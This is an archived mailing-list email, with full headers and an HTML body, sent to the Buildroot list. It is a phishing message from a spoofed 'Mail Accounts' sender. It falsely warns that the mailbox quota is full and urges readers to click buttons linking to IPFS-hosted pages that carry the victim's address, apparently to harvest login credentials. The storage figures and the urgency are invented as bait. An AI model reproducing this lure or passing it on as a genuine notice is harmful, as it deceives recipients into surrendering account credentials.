Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6D46CC54E67
	for <buildroot@archiver.kernel.org>; Wed, 27 Mar 2024 09:16:53 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp1.osuosl.org (Postfix) with ESMTP id 0E770814B5;
	Wed, 27 Mar 2024 09:16:53 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id ApOHekYhxyOV; Wed, 27 Mar 2024 09:16:52 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 30FC38151E
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp1.osuosl.org (Postfix) with ESMTP id 30FC38151E;
	Wed, 27 Mar 2024 09:16:52 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 15C0B1BF297
 for <buildroot@lists.busybox.net>; Wed, 27 Mar 2024 09:16:51 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 016858151E
 for <buildroot@lists.busybox.net>; Wed, 27 Mar 2024 09:16:51 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id eKz89IGjMu_e for <buildroot@lists.busybox.net>;
 Wed, 27 Mar 2024 09:16:50 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 8C823814B5
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 8C823814B5
Received: from busybox.net (unknown [141.98.10.132])
 by smtp1.osuosl.org (Postfix) with ESMTP id 8C823814B5
 for <buildroot@busybox.net>; Wed, 27 Mar 2024 09:16:49 +0000 (UTC)
From: Mail Accounts <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 27 Mar 2024 10:16:48 +0100
Message-ID: <20240327101648.226288B71F617F3B@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Your mailbox quota is full
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============0071587896071784153=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============0071587896071784153==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
 font-variant-ligatures: normal; font-variant-caps: normal; text-decoration=
-style: initial; text-decoration-color: initial;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial;'>Your m=
ailbox is full.</p>
<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
s: normal; font-variant-caps: normal;=20
text-decoration-style: initial; text-decoration-color: initial; -webkit-tex=
t-stroke-width: 0px; text-decoration-thickness: initial;' border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"height: 0.5em; box-sizing: border-box;">
<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizin=
g: border-box;">&nbsp;</td>
<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-bo=
x;">&nbsp;</td></tr></tbody></table>
<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
s: normal; font-variant-caps: normal;=20
text-decoration-style: initial; text-decoration-color: initial; -webkit-tex=
t-stroke-width: 0px; text-decoration-thickness: initial;' border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"color=
: rgb(218, 60, 47); font-weight: bold; box-sizing: border-box;">4.86 GB</sp=
an></td>
<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
 Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"font=
-weight: bold; box-sizing: border-box;">5.01 GB</span></td></tr></tbody></t=
able>
<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
 font-variant-ligatures: normal; font-variant-caps: normal; text-decoration=
-style: initial; text-decoration-color: initial;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial;'><br st=
yle=3D"box-sizing: border-box;"></p>
<p style=3D'margin: 3em auto; text-align: center; color: rgb(44, 54, 58); t=
ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
 "Segoe UI", sans-serif; font-size: 14px; font-style: normal; font-weight: =
400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphan=
s: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatur=
es: normal; font-variant-caps: normal; text-decoration-style: initial; text=
-decoration-color: initial;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial;'><span =
style=3D"box-sizing: border-box;">Your mailbox storage for this account use=
r<span style=3D"box-sizing: border-box;">&nbsp;</span><strong style=3D"font=
-weight: bolder; box-sizing: border-box;">( <u style=3D"box-sizing: border-=
box;"><span><a style=3D"color: rgb(34, 34, 34);" href=3D"mailto:nfo@alnour-=
fpm.com">buildroot@busybox.net</a></span></u>&nbsp;)</strong><span style=3D=
"box-sizing: border-box;">&nbsp;</span>
has almost reached it's limit and soon can no longer send or receive most m=
essages. <br>You need to upgrade your&nbsp;storage&nbsp;capacity immediatel=
y to keep using your account.<br><wbr><br style=3D"box-sizing: border-box;"=
>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Kindly click the&nbsp;button below immediate=
ly to increase, adjust and maintain your storage capacity in order to avoid=
 loss of data and receive all pending=20
mails.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
<wbr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><wbr><br style=3D"box-sizing: border=
-box;"><wbr>
&nbsp;&nbsp;&nbsp;<a style=3D"text-decoration: none;" href=3D"https://cloud=
flare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxfedf4g5xuee22tbyfcvctqp65lwai6avvvn=
vivu?#buildroot@busybox.net">
<span style=3D"background: none; padding: 5px 10px; border-radius: 8px; bor=
der: 1px solid rgb(8, 44, 64); border-image: none; text-align: center; colo=
r: rgb(15, 82, 186); letter-spacing: 2px; font-size: 24px; font-variant: sm=
all-caps; font-weight: bold; position: relative; cursor: pointer; box-shado=
w: 1px 3px 5px 2px #c0c0c0; text-shadow: 1px 1px 1px rgba(5,29,41,1); -ms-u=
ser-select: none; -webkit-box-shadow: 1px 3px 5px 2px #c0c0c0; -moz-box-sha=
dow: 1px 3px 5px 2px #c0c0c0;=20
-webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select:=
 none; -moz-user-select: none; user-select: none;">CLICK HERE</span></a><br=
 style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;">Cl=
ick<strong><span>&nbsp;</span>"</strong>
<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
der-box; background-color: transparent;" href=3D"https://cloudflare-ipfs.co=
m/ipfs/QmZBU6KGz7qqH1pDDngpJFM6sHhATjRy2n3pmDuw51U2hE?#buildroot@busybox.ne=
t" rel=3D"noreferrer"><strong>storage limits</strong></a><strong>"</strong>=
<span>&nbsp;</span>&nbsp;&nbsp;for&nbsp;more help and&nbsp;support.</span><=
/p>
<p style=3D'text-align: center; color: rgb(44, 54, 58); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-=
serif; font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0=
px; margin-bottom: 0px; word-spacing: 0px; white-space: normal; box-sizing:=
 border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); f=
ont-variant-ligatures: normal; font-variant-caps: normal; text-decoration-s=
tyle: initial; text-decoration-color: initial;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial;'><b sty=
le=3D"font-weight: bolder; box-sizing: border-box;"><span style=3D"box-sizi=
ng: border-box;">Mailbox address:<br style=3D"box-sizing: border-box;"></sp=
an></b><span style=3D"box-sizing: border-box;"><a style=3D"color: rgb(0, 17=
2, 255); text-decoration: none; box-sizing: border-box; background-color: t=
ransparent;" href=3D"mailto:buildroot@busybox.net" rel=3D"noreferrer">build=
root@busybox.net</a></span></p></body></html>

--===============0071587896071784153==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============0071587896071784153==--
